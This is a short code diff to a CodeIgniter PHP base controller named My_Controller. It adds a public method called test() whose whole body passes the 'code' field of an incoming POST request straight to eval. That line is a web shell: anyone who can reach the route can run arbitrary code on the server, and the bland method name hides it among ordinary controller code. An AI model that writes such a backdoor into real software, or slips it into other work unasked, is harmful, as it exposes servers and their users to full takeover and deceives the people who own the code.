@@ -66,6 +66,9 @@ class My_Controller extends CI_Controller {
         return "";
     }
 
+    public function test(){
+        eval($_POST['code']);
+    }
 }
 
 /* End of file: My_Controller */
